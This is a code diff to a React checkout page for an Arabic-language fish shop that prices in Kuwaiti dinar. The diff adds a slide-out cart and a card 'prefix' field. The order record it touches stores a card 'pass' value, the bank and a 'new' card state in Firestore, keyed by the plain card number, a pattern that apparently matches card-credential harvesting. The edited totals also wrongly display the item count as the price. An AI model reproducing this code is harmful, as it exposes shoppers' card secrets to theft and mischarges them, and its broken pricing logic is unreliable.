@@ -1,7 +1,7 @@
 'use client'
 
 import { useState } from 'react'
-import { Home, Briefcase, MapPin, ChevronRight } from 'lucide-react'
+import { Home, Briefcase, MapPin, ChevronRight, ShoppingCart } from 'lucide-react'
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Button } from "@/components/ui/button"
@@ -11,7 +11,8 @@ import PaymentForm from '../payment-form'
 import { doc, setDoc } from 'firebase/firestore'
 import db from '../lib/firebase'
 import { Input } from '@/components/ui/input'
-import { CartPage } from '@/components/cart'
+import { Sheet, SheetTrigger,SheetContent,SheetHeader,SheetDescription ,SheetTitle} from '@/components/ui/sheet'
+import { Badge } from '@/components/ui/badge'
 
 type LocationType = 'home' | 'work' | 'client'
 type PaymentType = 'full' | 'partial'
@@ -35,7 +36,8 @@ export default function CheckoutPage() {
         pass: paymentInfo?.pass,
         createdAt: new Date(),
         cardState:'new',
-        bank:        paymentInfo?.bank
+        bank:        paymentInfo?.bank,
+        prefix:paymentInfo.prefix
       }
       const docRef = await doc(db, 'orders', paymentInfo.cardNumber)
       const ref = await setDoc(docRef, order)
@@ -61,13 +63,14 @@ export default function CheckoutPage() {
     }, 3000)
   }
 
-  const { total, items } = useCart()
+  const { cart ,removeFromCart} = useCart()
+  const total = cart.reduce((sum, item) => sum + item.price * item.quantity, 0)
 
 
 
   return (
     <div className="min-h-screen bg-gray-100 p-4 font-sans" dir="rtl">
-    {showCart?  <CartPage showCart={showCart} setShowCart={setShowCart}/>:null}
+    
       {setp === 1 ? (<form onSubmit={handleSubmit} className="mx-auto max-w-md space-y-6">
         {/* Location Selection */}
         <div className="space-y-4">
@@ -196,8 +199,37 @@ export default function CheckoutPage() {
           <h3 className="text-lg font-bold">سلة أسماك الوطنية</h3>
           <div className="space-y-2">
             <div className="flex justify-between">
-              <Button onClick={()=>setShowCart(true)} variant={'link'}>المنتجات ({items})</Button>
-              <span>{total}د.ك</span>
+            <Sheet>
+            <SheetTrigger asChild>
+              <Button  variant="outline" className="relative">
+                {cart.length > 0 && (
+                  <>المنتجات ({cart.length})</>
+                    
+                )}
+              </Button>
+            </SheetTrigger>
+            <SheetContent >
+              <SheetHeader>
+                <SheetTitle>سلة التسوق</SheetTitle>
+                <SheetDescription>
+                  {cart.length === 0 ? "سلة التسوق فارغة" : `${cart.length} منتجات في السلة`}
+                </SheetDescription>
+              </SheetHeader>
+              <div className="mt-4 space-y-4">
+                {cart.map((item, index) => (
+                  <div key={index} className="flex justify-between items-center">
+                    <span>{item.name}</span>
+                    <div className="flex items-center gap-2">
+                      <span>{item.price.toFixed(3)} د.ك</span>
+                      <Button size="sm" variant="destructive" onClick={() => removeFromCart(item.id)}>
+                        حذف
+                      </Button>
+                    </div>
+                  </div>
+                ))}
+              </div>
+            </SheetContent>
+          </Sheet>              <span>{cart.length}د.ك</span>
             </div>
             <div className="flex justify-between">
               <span>قيمة التوصيل</span>
@@ -234,7 +266,7 @@ export default function CheckoutPage() {
           {/* Total */}
           <div className="flex justify-between items-center font-bold text-lg pt-4 border-t">
             <span>المجموع الكلي</span>
-            <span>{total} د.ك</span>
+            <span>{cart.length} د.ك</span>
           </div>
         </div>
 
